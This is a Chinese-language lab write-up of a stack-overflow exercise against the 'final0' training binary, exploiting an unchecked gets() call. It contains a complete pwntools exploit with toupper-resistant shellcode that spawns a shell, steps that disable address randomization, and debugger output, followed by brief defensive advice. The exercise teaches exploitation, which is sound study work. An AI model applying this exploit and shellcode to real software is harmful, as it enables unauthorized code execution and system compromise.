# 栈溢出实验5

## 实验概述

### 【目的】
1. 运行final0,反弹得到shell
### 【环境】
Linux
### 【工具】
python，gdb
### 【原理】
缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。
## 实验步骤

### 【步骤】
#### final0
通过binwalk查看，是32位程序
```
$ binwalk final0

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)

```
用IDA pro打开，定位到关键函数
```
char *get_username()
{
  size_t v0; // eax@7
  char s[512]; // [sp+8h] [bp-210h]@1
  char *v3; // [sp+208h] [bp-10h]@1
  unsigned int i; // [sp+20Ch] [bp-Ch]@5

  memset(s, 0, 0x200u);
  gets(s);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  v3 = strchr(s, 13);
  if ( v3 )
    *v3 = 0;
  for ( i = 0; ; ++i )
  {
    v0 = strlen(s);
    if ( v0 <= i )
      break;
    s[i] = toupper(s[i]);
  }
  return strdup(s);
}
```
可以看到其中使用了gets()，存在溢出点，ret地址的偏移为0x210+4=532。
需要注意的是，函数中对每个字节都调用了toupper()进行转换，把字符数组中的小写字母转换成大写字母，即常规的shellcode会因为大小写转换而失效。
这里我们使用[shellcode](https://www.exploit-db.com/exploits/13460/)提供的不会因toupper()转换而失效的shellcode。

由于需要定位shellcode的地址，这里仍需关闭地址随机化，并开启core dump。
```
ulimit -c 1024
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```
获取shellcode的地址。
```
$ ulimit -c unlimited
$ sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
$ python -c "'a'*600" | ./final0 
$ gdb final0 core -q
gdb-peda$ x/10wx $esp-540
0xffffccd4:	0x00000007	0x41414141	0x41414141	0x41414141
0xffffcce4:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffccf4:	0x41414141	0x41414141

```
可以看到地址是0xffffccd8，到这就可以编写脚本了。
```
from pwn import *

io = process('./final0')

shellcode  = "\xeb\x29\x5e\x29\xc9\x89\xf3\x89\x5e\x08\xb1\x07"
shellcode += "\x80\x03\x20\x43\xe0\xfa\x29\xc0\x88\x46\x07\x89\x46\x0c"
shellcode += "\xb0\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80"
shellcode += "\x29\xc0\x40\xcd\x80\xe8\xd2\xff\xff\xff"
shellcode += "\x0f\x42\x49\x4e\x0f\x53\x48"

payload = shellcode
payload += (532-len(shellcode))*'a'
payload += p32(0xffffccd8)


io.sendline(payload)
io.interactive()
```

```
$ python final0.py 
[+] Starting local process './final0': pid 4535
[*] Switching to interactive mode
$ echo u got it
u got it
$  

```
### 【总结】

本次实验主要在shellcode上发生了改变，可以考虑到在实际的漏洞利用中，shellcode需要根据实际情况做各种调整。
可以发现，要使栈溢出发生，要满足以下条件：

- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。